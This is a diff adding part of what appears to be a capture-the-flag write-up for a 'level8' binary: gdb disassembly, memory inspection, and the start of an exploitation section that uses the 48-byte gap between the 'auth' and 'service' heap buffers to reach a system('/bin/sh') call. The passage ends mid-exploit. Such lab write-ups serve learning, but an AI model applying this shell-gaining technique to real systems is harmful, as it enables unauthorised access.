@@ -138,3 +138,123 @@ We start to work with gdb in Intel syntax (set disassembly-flavor intel):
    		0x080486bb <+343>:	mov    eax,0x804882d
    		0x080486c0 <+348>:	mov    ecx,0x5
    		0x080486c5 <+353>:	mov    esi,edx
+   		0x080486c7 <+355>:	mov    edi,eax
+   		0x080486c9 <+357>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+   		0x080486cb <+359>:	seta   dl
+   		0x080486ce <+362>:	setb   al
+   		0x080486d1 <+365>:	mov    ecx,edx
+   		0x080486d3 <+367>:	sub    cl,al
+   		0x080486d5 <+369>:	mov    eax,ecx
+   		0x080486d7 <+371>:	movsx  eax,al
+   		0x080486da <+374>:	test   eax,eax
+
+	Continue with main process:
+   		0x080486dc <+376>:	jne    0x8048574 <main+16>
+   		0x080486e2 <+382>:	mov    eax,ds:0x8049aac 	;check global auth
+   		0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20] ;take 32nd byte
+   		0x080486ea <+390>:	test   eax,eax 			;check if it exists
+   		0x080486ec <+392>:	je     0x80486ff <main+411>
+   		0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833 	;argument to system
+   		0x080486f5 <+401>:	call   0x8048480 <system@plt>		;call system
+   		0x080486fa <+406>:	jmp    0x8048574 <main+16> 	;to the beginning of the cycle
+   		0x080486ff <+411>:	mov    eax,ds:0x8049aa0 	;preparation to fwrite
+   		0x08048704 <+416>:	mov    edx,eax 			;preparation to fwrite
+   		0x08048706 <+418>:	mov    eax,0x804883b 		;preparation to fwrite
+   		0x0804870b <+423>:	mov    DWORD PTR [esp+0xc],edx 	;argument to fwrite
+   		0x0804870f <+427>:	mov    DWORD PTR [esp+0x8],0xa 	;argument to fwrite
+   		0x08048717 <+435>:	mov    DWORD PTR [esp+0x4],0x1 	;argument to fwrite
+   		0x0804871f <+443>:	mov    DWORD PTR [esp],eax 	;argument to fwrite
+   		0x08048722 <+446>:	call   0x8048450 <fwrite@plt>	;call fwrite
+   		0x08048727 <+451>:	jmp    0x8048574 <main+16>
+   		0x0804872c <+456>:	nop
+   		0x0804872d <+457>:	mov    eax,0x0
+   		0x08048732 <+462>:	lea    esp,[ebp-0x8]
+   		0x08048735 <+465>:	pop    esi
+   		0x08048736 <+466>:	pop    edi
+   		0x08048737 <+467>:	pop    ebp
+   		0x08048738 <+468>:	ret
+
+Something new!\
+Let's see some insites by their addresses:
+
+	(gdb) x/s 0x8049ab0
+		0x8049ab0 <service>:	 ""
+	(gdb) x/s 0x8049aac
+		0x8049aac <auth>:	 ""
+	(gdb) x/s 0x8048810
+		0x8048810:	 "%p, %p \n"
+	(gdb) x/s 0x8049a80
+		0x8049a80 <stdin@@GLIBC_2.0>:	 "\300", <incomplete sequence \375\267>
+	(gdb) x/s 0x8048819
+		0x8048819:	 "auth "
+	(gdb) x/s 0x804881f
+		0x804881f:	 "reset"
+	(gdb) x/s 0x8048825
+		0x8048825:	 "service"
+	(gdb) x/s 0x8048833
+		0x8048833:	 "/bin/sh"
+	(gdb) x/s 0x8049aa0
+		0x8049aa0 <stdout@@GLIBC_2.0>:	 " ", <incomplete sequence \375\267>
+	(gdb) x/s 0x804883b
+		0x804883b:	 "Password:\n"
+
+Finally let's find out the size of the buffer printing a lot of As for `fgets`:
+
+	(gdb) info frame
+		Stack level 0, frame at 0xbffff710:
+		 eip = 0x80485b3 in main; saved eip *0xb7e454d3*
+		 Arglist at 0xbffff708, args:
+		 Locals at 0xbffff708, Previous frame's sp is 0xbffff710
+		 Saved registers:
+		  ebp at 0xbffff708, esi at 0xbffff700, edi at 0xbffff704, eip at 0xbffff70c
+	(gdb) x/70wx $esp
+		0xbffff660:	0xbffff680	0x00000080	0xb7fd1ac0	0xb7fd0ff4
+		0xbffff670:	0xbffff6be	0xbffff6bf	0x00000001	0xb7ec3c49
+		0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6a0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x00414141
+		0xbffff700:	0x00000000	0x00000000	0x00000000	*0xb7e454d3*
+	(gdb) p 0xbffff700 - 0xbffff680
+		$3 = 128
+
+Numbers in hex are transferred to decimal with the help of programming calculator and finally we write the code in C.
+
+# Exploitation
+
+We need to print special strings that will be compared to values with the help of `strcmp`. So let's start:
+
+	(gdb) x/10wx 0x8049aac
+		0x8049aac <auth>:	0x0804a008	0x00000000	0x00000000	0x00000000
+		0x8049abc:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x8049acc:	0x00000000	0x00000000
+	(gdb) x/10wx 0x8049ab0
+		0x8049ab0 <service>:	0x0804a038	0x00000000	0x00000000	0x00000000
+		0x8049ac0:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x8049ad0:	0x00000000	0x00000000
+	(gdb) p 0x0804a038 - 0x804a008
+		$2 = 48
+
+That is how we find out that distance between two globals is 48 bytes.
+	
+	Starting program: /home/user/level8/level8
+		(nil), (nil)
+		auth
+	Breakpoint 3, 0x08048574 in main ()
+	(gdb) x/4s 0x0804a008
+		0x804a008:	 "\n"
+		0x804a00a:	 ""
+		0x804a00b:	 ""
+		0x804a00c:	 ""
+	(gdb) x/4s 0x0804a038
+		0x804a038:	 ""
+		0x804a039:	 ""
+		0x804a03a:	 ""
+		0x804a03b:	 ""
+	Continuing.
+		0x804a008, (nil)
+		service service
